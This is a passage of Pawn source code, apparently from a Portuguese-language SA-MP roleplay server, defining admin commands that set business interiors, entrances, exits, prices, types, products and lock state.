		bInfo[id][ExitY] = 128.020996;
		bInfo[id][ExitZ] = 1035.419922;

		bInfo[id][Interior] = 6;

		bInfo[id][ActorX] = -2238.0476;
		bInfo[id][ActorY] = 128.5868;
		bInfo[id][ActorZ] = 1035.4141;
		bInfo[id][ActorAngle] = 0.9806;
		bInfo[id][ActorModel] = 289;
	}
	else if(strcmp(nome, "apostas", true) == 0)
	{
        bInfo[id][Price] = 185000;
        bInfo[id][Type] = BTYPE_APOSTAS;
        
		bInfo[id][ExitX] = 833.818970;
		bInfo[id][ExitY] = 7.418000;
		bInfo[id][ExitZ] = 1004.179993;

		bInfo[id][Interior] = 3;

		bInfo[id][ActorX] = 820.1870;
		bInfo[id][ActorY] = 2.3883;
		bInfo[id][ActorZ] = 1004.1797;
		bInfo[id][ActorAngle] = 270.5856;
		bInfo[id][ActorModel] = 194;
	}
	else if(strcmp(nome, "seguradora", true) == 0)
	{
        bInfo[id][Price] = 300000;
        bInfo[id][Type] = BTYPE_SEGURADORA;
        
		bInfo[id][ExitX] = 2828.0786;
		bInfo[id][ExitY] = -1679.4679;
		bInfo[id][ExitZ] = 663.8648;
		bInfo[id][ExitAngle] = 179.1772;

		bInfo[id][Interior] = 0;
	}
	else if(strcmp(nome, "ccomercial", true) == 0)
	{
        bInfo[id][Price] = 500000;
        bInfo[id][Type] = BTYPE_CENTROCOMERCIAL;
        
		bInfo[id][ExitX] = 270.3064;
		bInfo[id][ExitY] = 147.1894;
		bInfo[id][ExitZ] = 1033.3920;
		bInfo[id][ExitAngle] = 179.1772;

		bInfo[id][Interior] = 0;
	}

	GuardarBizz(id);
	AtualizarBiz(id);

    format(string, sizeof(string), "Configuraste a loja %d automaticamente com a config %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizsell(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizsell <id>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	if(bInfo[id][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");

	bInfo[id][Comprada] = 0;
	bInfo[id][Locked] = 1;
	bInfo[id][Produtos] = 0;
	bInfo[id][Bank] = 0;
	bInfo[id][PickupID] = 1272;
	bInfo[id][Entrada] = 0;
	format(bInfo[id][Nome], 32, "%s", "Unused");
	format(bInfo[id][Owner], 32, "%s", "Ninguém");
	
	GuardarBizz(id);
	AtualizarBiz(id);

    format(string, sizeof(string), "Vendeste a loja %d", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizint(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, interior;

    if(sscanf(params, "dd", id, interior))
    {
		SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizint <id> <interior>");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}1: Barberia - 2: Big Spread Ranch (Bar) - 3: Burger Shot (Eat) - 4: Cluckin Bell (EAT)");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}5: Well Stacked Pizza (Eat) - 6: Rusty Browns Dohnuts (Eat) - 7: Jays Diner (Eat) - 8: Pump Truck Stop Diner (Eat)");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}9: Alhambra (Drink) - 10: Mistys (Drink) - 11: Lil' Probe Inn (Drink) - 12: Exclusive (Clothes) - 13: Binco (Clothes)");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}14: ProLaps (Clothes) - 15: SubUrban (Clothes) - 16: Victim (Clothes) - 17: Zip (Clothes) - 18: Redsands Casino");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}19: Off Track Betting - 20: Sex Shop - 21: Zeros RC Shop - 22-25: Ammunations (Gun) - 26: Ammu Shooting Range (DONT USE)");
		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}27: Jizzys (Drink) - 27-33: 24-7's (Buy) - 34: Papelaria - 35: Centro Comercial - 36: Office");
		return 1;
	}
	
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    if(interior < 0 || interior > 36) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Interior inválido");
    
    new string[64];
    
    switch(interior)
    {
        case 1: 
        {
			bInfo[id][ExitX] = 411.625976;
			bInfo[id][ExitY] = -21.433298;
			bInfo[id][ExitZ] = 1001.804687;
			
			bInfo[id][Interior] = 2;
			
			bInfo[id][ActorX] = 414.0713;
			bInfo[id][ActorY] = -14.8485;
			bInfo[id][ActorZ] = 1001.8047;
			bInfo[id][ActorAngle] = 185.7458;
			bInfo[id][ActorModel] = 156;
			
			format(string, sizeof string, "Loja: %d - Descrição: Barbearia.", id);
			SendClientMessage(playerid, COLOR_INFO , string);
        }
        case 2:
        {
			bInfo[id][ExitX] = 1212.019897;
			bInfo[id][ExitY] = -28.663099;
			bInfo[id][ExitZ] = 1001.089966;
			
			bInfo[id][Interior] = 2;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Big Spread Ranch Strip Club.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case 3: 
        {
			bInfo[id][ExitX] = 363.1974;
			bInfo[id][ExitY] = -74.8233;
			bInfo[id][ExitZ] = 1001.5078;
			
			bInfo[id][Interior] = 10;
			
			bInfo[id][ActorX] = 376.4986;
			bInfo[id][ActorY] = -65.8491;
			bInfo[id][ActorZ] = 1001.5078;
			bInfo[id][ActorAngle] = 179.6272;
			bInfo[id][ActorModel] = 205;
			
			format(string, sizeof string, "Loja: %d - Descrição: Burger Shot.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 4: 
        {
			bInfo[id][ExitX] = 365.672974;
			bInfo[id][ExitY] = -10.713200;
			bInfo[id][ExitZ] = 1001.869995;
			
			bInfo[id][Interior] = 9;
			
			bInfo[id][ActorX] = 368.1107;
			bInfo[id][ActorY] = -4.4927;
			bInfo[id][ActorZ] = 1001.8516;
			bInfo[id][ActorAngle] = 177.1600;
			bInfo[id][ActorModel] = 167;
			
			format(string, sizeof string, "Loja: %d - Descrição: Cluckin Bell.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 5:
        {
			bInfo[id][ExitX] = 372.351990;
			bInfo[id][ExitY] = -131.650986;
			bInfo[id][ExitZ] = 1001.449951;
			
			bInfo[id][Interior] = 5;
			
			bInfo[id][ActorX] = 374.7303;
			bInfo[id][ActorY] = -117.2787;
			bInfo[id][ActorZ] = 1001.4922;
			bInfo[id][ActorAngle] = 178.0372;
			bInfo[id][ActorModel] = 155;

			format(string, sizeof string, "Loja: %d - Descrição: Well Stacked Pizza.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 6:
        {
			bInfo[id][ExitX] = 377.098999;
			bInfo[id][ExitY] = -192.439987;
			bInfo[id][ExitZ] = 1000.643982;
			
			bInfo[id][Interior] = 17;

			bInfo[id][ActorX] = 380.7200;
			bInfo[id][ActorY] = -189.1140;
			bInfo[id][ActorZ] = 1000.6328;
			bInfo[id][ActorAngle] = 180.1055;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: Rusty Brown Dohnuts.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 7:
        {
			bInfo[id][ExitX] = 460.099976;
			bInfo[id][ExitY] = -88.428497;
			bInfo[id][ExitZ] = 999.621948;
			
			bInfo[id][Interior] = 4;

			bInfo[id][ActorX] = 449.3911;
			bInfo[id][ActorY] = -82.2323;
			bInfo[id][ActorZ] = 999.5547;
			bInfo[id][ActorAngle] = 180.7716;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: Jays Diner.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 8:
        {
			bInfo[id][ExitX] = 681.474976;
			bInfo[id][ExitY] = -451.150970;
			bInfo[id][ExitZ] = -25.616798;
			
			bInfo[id][Interior] = 1;
			
			bInfo[id][ActorX] = 681.4504;
			bInfo[id][ActorY] = -455.4607;
			bInfo[id][ActorZ] = -25.6099;
			bInfo[id][ActorAngle] = 359.5614;
			bInfo[id][ActorModel] = 9;

			format(string, sizeof string, "Loja: %d - Descrição: Pump Truck Stop Diner.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 9:
        {
			bInfo[id][ExitX] = 493.3351;
			bInfo[id][ExitY] = -24.6042;
			bInfo[id][ExitZ] = 1000.6797;
			
			bInfo[id][Interior] = 17;
			
			bInfo[id][ActorX] = 501.8495;
			bInfo[id][ActorY] = -21.4766;
			bInfo[id][ActorZ] = 1000.6797;
			bInfo[id][ActorAngle] = 87.3976;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: Alhambra.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 10:
        {
			bInfo[id][ExitX] = 501.980988;
			bInfo[id][ExitY] = -69.150200;
			bInfo[id][ExitZ] = 998.834961;
			
			bInfo[id][Interior] = 11;
			
			bInfo[id][ActorX] = 499.7752;
			bInfo[id][ActorY] = -77.5624;
			bInfo[id][ActorZ] = 998.7651;
			bInfo[id][ActorAngle] = 2.6041;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: Mistys.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 11: 
        {
			bInfo[id][ExitX] = -228.9999;
			bInfo[id][ExitY] = 1401.5785;
			bInfo[id][ExitZ] = 27.769798;
			
			bInfo[id][Interior] = 18;
			
			bInfo[id][ActorX] = -223.3081;
			bInfo[id][ActorY] = 1406.1765;
			bInfo[id][ActorZ] = 27.7734;
			bInfo[id][ActorAngle] = 82.4471;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: Lil' Probe Inn.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 12:
        {
			bInfo[id][ExitX] = 204.3197;
			bInfo[id][ExitY] = -168.4327;
			bInfo[id][ExitZ] = 1000.578979;
			
			bInfo[id][Interior] = 14;
			
			bInfo[id][ActorX] = 204.4223;
			bInfo[id][ActorY] = -157.8301;
			bInfo[id][ActorZ] = 1000.5234;
			bInfo[id][ActorAngle] = 179.2678;
			bInfo[id][ActorModel] = 211;

			format(string, sizeof string, "Loja: %d - Descrição: EXcLusive.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 13:
        {
			bInfo[id][ExitX] = 207.6663;
			bInfo[id][ExitY] = -110.5711;
			bInfo[id][ExitZ] = 1005.269958;
			
			bInfo[id][Interior] = 15;
			
			bInfo[id][ActorX] = 208.8333;
			bInfo[id][ActorY] = -98.7053;
			bInfo[id][ActorZ] = 1005.2578;
			bInfo[id][ActorAngle] = 178.5156;
			bInfo[id][ActorModel] = 211;

			format(string, sizeof string, "Loja: %d - Descrição: Binco.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 14:
        {
			bInfo[id][ExitX] = 207.054993;
			bInfo[id][ExitY] = -138.804993;
			bInfo[id][ExitZ] = 1003.519958;
			
			bInfo[id][Interior] = 3;
			
			bInfo[id][ActorX] = 207.0232;
			bInfo[id][ActorY] = -127.8072;
			bInfo[id][ActorZ] = 1003.5078;
			bInfo[id][ActorAngle] = 179.7063;
			bInfo[id][ActorModel] = 211;
			
			format(string, sizeof string, "Loja: %d - Descrição: ProLaps.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 15:
        {
			bInfo[id][ExitX] = 203.8892;
			bInfo[id][ExitY] = -50.1709;
			bInfo[id][ExitZ] = 1001.799988;
			
			bInfo[id][Interior] = 1;
			
			bInfo[id][ActorX] = 203.2186;
			bInfo[id][ActorY] = -41.6711;
			bInfo[id][ActorZ] = 1001.8047;
			bInfo[id][ActorAngle] = 178.0142;
			bInfo[id][ActorModel] = 211;
			
			format(string, sizeof string, "Loja: %d - Descrição: SubUrban.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 16:
        {
			bInfo[id][ExitX] = 226.293991;
			bInfo[id][ExitY] = -7.431530;
			bInfo[id][ExitZ] = 1002.259949;
			
			bInfo[id][Interior] = 5;
			
			bInfo[id][ActorX] = 204.8535;
			bInfo[id][ActorY] = -7.2751;
			bInfo[id][ActorZ] = 1001.2109;
			bInfo[id][ActorAngle] = 265.3326;
			bInfo[id][ActorModel] = 211;
			
			format(string, sizeof string, "Loja: %d - Descrição: Victim.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 17:
        {
			bInfo[id][ExitX] = 161.3083;
			bInfo[id][ExitY] = -96.3637;
			bInfo[id][ExitZ] = 1001.804687;
			
			bInfo[id][Interior] = 18;
			
			bInfo[id][ActorX] = 162.7960;
			bInfo[id][ActorY] = -81.1917;
			bInfo[id][ActorZ] = 1001.8047;
			bInfo[id][ActorAngle] = 180.2932;
			bInfo[id][ActorModel] = 211;
			
			format(string, sizeof string, "Loja: %d - Descrição: Zip.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 18:
        {
			bInfo[id][ExitX] = 1133.2266;
			bInfo[id][ExitY] = -15.573059;
			bInfo[id][ExitZ] = 1000.750000;
			
			bInfo[id][Interior] = 12;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Small Casino in Redsands West.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 19:
        {
			bInfo[id][ExitX] = 833.818970;
			bInfo[id][ExitY] = 7.418000;
			bInfo[id][ExitZ] = 1004.179993;
			
			bInfo[id][Interior] = 3;
			
			bInfo[id][ActorX] = 820.1870;
			bInfo[id][ActorY] = 2.3883;
			bInfo[id][ActorZ] = 1004.1797;
			bInfo[id][ActorAngle] = 270.5856;
			bInfo[id][ActorModel] = 194;

			format(string, sizeof string, "Loja: %d - Descrição: Off Track Betting.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 20:
        {
			bInfo[id][ExitX] = -100.325996;
			bInfo[id][ExitY] = -25.816500;
			bInfo[id][ExitZ] = 1000.741943;
			
			bInfo[id][Interior] = 3;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
            bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Sex Shop.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 21: 
        {
			bInfo[id][ExitX] = -2240.569824;
			bInfo[id][ExitY] = 128.020996;
			bInfo[id][ExitZ] = 1035.419922;

			bInfo[id][Interior] = 6;

			bInfo[id][ActorX] = -2238.0476;
			bInfo[id][ActorY] = 128.5868;
			bInfo[id][ActorZ] = 1035.4141;
			bInfo[id][ActorAngle] = 0.9806;
			bInfo[id][ActorModel] = 289;
			
			format(string, sizeof string, "Loja: %d - Descrição: Zero's RC Shop.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 22: 
        {
			bInfo[id][ExitX] = 286.148987;
			bInfo[id][ExitY] = -40.644398;
			bInfo[id][ExitZ] = 1001.569946;
			
			bInfo[id][Interior] = 1;
			
			bInfo[id][ActorX] = 295.1808;
			bInfo[id][ActorY] = -40.2152;
			bInfo[id][ActorZ] = 1001.5156;
			bInfo[id][ActorAngle] = 355.4662;
			bInfo[id][ActorModel] = 179;

			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 1.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 23:
        {
			bInfo[id][ExitX] = 285.800995;
			bInfo[id][ExitY] = -86.547600;
			bInfo[id][ExitZ] = 1001.539978;
			
			bInfo[id][Interior] = 4;
			
			bInfo[id][ActorX] = 295.5957;
			bInfo[id][ActorY] = -82.5282;
			bInfo[id][ActorZ] = 1001.5156;
			bInfo[id][ActorAngle] = 355.4659;
			bInfo[id][ActorModel] = 179;
			
			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 2.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 24:
        {
			bInfo[id][ExitX] = 296.919983;
			bInfo[id][ExitY] = -111.071999;
			bInfo[id][ExitZ] = 1001.569946;
			
			bInfo[id][Interior] = 6;
			
			bInfo[id][ActorX] = 291.4510;
			bInfo[id][ActorY] = -104.4912;
			bInfo[id][ActorZ] = 1001.5156;
			bInfo[id][ActorAngle] = 179.2061;
			bInfo[id][ActorModel] = 179;

			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 3.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 25:
        {
			bInfo[id][ExitX] = 316.524994;
			bInfo[id][ExitY] = -167.706985;
			bInfo[id][ExitZ] = 999.661987;
			
			bInfo[id][Interior] = 7;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 4.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 26:
        {
			bInfo[id][ExitX] = 302.292877;
			bInfo[id][ExitY] = -143.139099;
			bInfo[id][ExitZ] = 1004.062500;
			
            bInfo[id][Interior] = 17;
            
   			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Ammunation Shooting Range.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 27:
        {
			bInfo[id][ExitX] = -2637.449951;
			bInfo[id][ExitY] = 1404.629883;
			bInfo[id][ExitZ] = 906.457947;
			
			bInfo[id][Interior] = 10;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: Jizzys.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 28:
        {
			bInfo[id][ExitX] = -25.884499;
			bInfo[id][ExitY] = -185.868988;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 18;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;
			
			format(string, sizeof string, "Loja: %d - Descrição: 24-7 1.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 29: 
        {
			bInfo[id][ExitX] = 6.091180;
			bInfo[id][ExitY] = -31.271898;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 10;
			
			bInfo[id][ActorX] = 3.3154;
			bInfo[id][ActorY] = -30.7009;
			bInfo[id][ActorZ] = 1003.5494;
			bInfo[id][ActorAngle] = 359.1631;
			bInfo[id][ActorModel] = 194;

			format(string, sizeof string, "Loja: %d - Descrição: 24-7 2.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 30: 
        {
			bInfo[id][ExitX] = -30.946699;
			bInfo[id][ExitY] = -91.609596;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 18;
			
			bInfo[id][ActorX] = -26.9505;
			bInfo[id][ActorY] = -91.6199;
			bInfo[id][ActorZ] = 1003.5469;
			bInfo[id][ActorAngle] = 3.7378;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: 24-7 3.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 31: 
        {
			bInfo[id][ExitX] = -25.132599;
			bInfo[id][ExitY] = -141.066986;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 16;
			
			bInfo[id][ActorX] = -20.8918;
			bInfo[id][ActorY] = -140.3370;
			bInfo[id][ActorZ] = 1003.5469;
			bInfo[id][ActorAngle] = 359.5393;
			bInfo[id][ActorModel] = 194;
			
			format(string, sizeof string, "Loja: %d - Descrição: 24-7 4.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 32:
        {
			bInfo[id][ExitX] = -27.312300;
			bInfo[id][ExitY] = -29.277599;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 4;

			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;

			format(string, sizeof string, "Loja: %d - Descrição: 24-7 5.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 33:
        {
			bInfo[id][ExitX] = -26.691599;
			bInfo[id][ExitY] = -55.714897;
			bInfo[id][ExitZ] = 1003.549988;
			
			bInfo[id][Interior] = 6;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;

			format(string, sizeof string, "Loja: %d - Descrição: 24-7 6.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 34:
        {
			bInfo[id][ExitX] = 833.269775;
			bInfo[id][ExitY] = 10.588416;
			bInfo[id][ExitZ] = 1004.179687;
			
			bInfo[id][Interior] = 6;
			
			bInfo[id][ActorX] = 0;
			bInfo[id][ActorY] = 0;
			bInfo[id][ActorZ] = 0;
			bInfo[id][ActorAngle] = 0;
			bInfo[id][ActorModel] = 0;

			format(string, sizeof string, "Loja: %d - Descrição: Papelaria.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 35:
        {
			bInfo[id][ExitX] = 270.3064;
			bInfo[id][ExitY] = 147.1894;
			bInfo[id][ExitZ] = 1033.3920;
			bInfo[id][ExitAngle] = 179.1772;

			bInfo[id][Interior] = 0;

			format(string, sizeof string, "Loja: %d - Descrição: Centro Comercial.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case 36:
        {
			bInfo[id][ExitX] = 2828.0786;
			bInfo[id][ExitY] = -1679.4679;
			bInfo[id][ExitZ] = 663.8648;
			bInfo[id][ExitAngle] = 179.1772;

			bInfo[id][Interior] = 0;

			format(string, sizeof string, "Loja: %d - Descrição: Centro Comercial.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
    }
	GuardarBizz(id);
	AtualizarBiz(id);

	return 1;
}

COMMAND:abizproducts(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, products;

    if(sscanf(params, "dd", id, products)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizproducts <id> <produtos>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    if(products < 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Type inválido");

	new string[128];

	bInfo[id][Produtos] = products;
	GuardarBizz(id);

    format(string, sizeof(string), "Setaste os produtos da loja %d para %d", id, products);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizexit(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizexit <id>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	new Float:x, Float:y, Float:z, Float:a;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);

	bInfo[id][ExitX] = x;
	bInfo[id][ExitY] = y;
 	bInfo[id][ExitZ] = z;
 	bInfo[id][ExitAngle] = a;
	GuardarBizz(id);

    format(string, sizeof(string), "Setaste a saída da loja %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizlock(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizlock <id>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	if(bInfo[id][Locked] == 0)
	{
        format(string, sizeof(string), "Trancaste a loja %d", id);
        bInfo[id][Locked] = 1;
	}
	else
	{
        format(string, sizeof(string), "Destrancaste a loja %d", id);
        bInfo[id][Locked] = 0;
	}
	GuardarBizz(id);

    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizentrance(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizentrance <id>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	new Float:x, Float:y, Float:z, VW, Int, Float:a;
	
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	bInfo[id][EnterX] = x;
	bInfo[id][EnterY] = y;
 	bInfo[id][EnterZ] = z;
 	bInfo[id][EnterAngle] = a;
 	bInfo[id][EnterInterior] = Int;
 	bInfo[id][EnterVirtualWorld] = VW;
	GuardarBizz(id);
	AtualizarBiz(id);

    format(string, sizeof(string), "Setaste a entrada da loja %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abiztype(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, type;

    if(sscanf(params, "dd", id, type))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abiztype <id> <type>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}1: Restaurante - 2: Bar - 3: 24/7 - 4: Gasolina - 5: Telecomunicações - 6: Stand");
	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}7: Loja de Caça - 8: Loja de Roupa - 9: Farmácia - 10: Loja de Apostas - 11: Seguradora");
	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}12: Centro Comercial");
	
	    return 1;
	}

    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    if(type <= 0 || type > 12) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Type inválido");

	new string[128];

	bInfo[id][Type] = type;
	GuardarBizz(id);
	AtualizarBiz(id);

    format(string, sizeof(string), "Setaste o type da loja %d para %d", id, type);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abizprice(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, price;

    if(sscanf(params, "dd", id, price)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizprice <id> <preço>");
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	bInfo[id][Price] = price;
	GuardarBizz(id);
	AtualizarBiz(id);
	
    format(string, sizeof(string), "Setaste a loja %d para custar %d$", id, price);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:resetbizzes(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new i, Float:distance = 6.0, Float:metres = distance, Float:a;
	
	for(; i < sizeof(bInfo); i++, metres += distance)
	{
	    if(i == 0) continue;
	    
		GetPlayerPos(playerid, bInfo[i][EnterX], bInfo[i][EnterY], bInfo[i][EnterZ]);
		GetPlayerFacingAngle(playerid, a);

		bInfo[i][EnterX] += (metres * floatsin(-a, degrees));
		bInfo[i][EnterY] += (metres * floatcos(-a, degrees));
		bInfo[i][EnterInterior] = 0;
		bInfo[i][EnterVirtualWorld] = 0;
		bInfo[i][Interior] = 0;
		bInfo[i][VirtualWorld] = i;
		bInfo[i][Comprada] = 0;
		bInfo[i][Price] = 0;
		bInfo[i][Locked] = 0;
		bInfo[i][Produtos] = 0;
		bInfo[i][Bank] = 0;
		bInfo[i][PickupID] = 1272;
		bInfo[i][Entrada] = 0;
  		format(bInfo[i][Nome], 32, "%s", "Unused");
